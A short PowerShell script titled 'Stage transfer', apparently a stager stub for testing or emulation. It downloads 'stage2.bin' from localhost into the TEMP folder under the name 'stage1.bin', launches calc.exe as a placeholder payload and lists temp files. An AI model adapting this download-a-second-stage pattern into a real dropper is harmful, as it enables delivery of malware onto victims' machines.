<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://localhost:8081/stage2.bin",
    [string]$Stage2Path = "$env:TEMP\stage1.bin"
)
try { (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $Stage2Path); Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Remote fetch failed" }
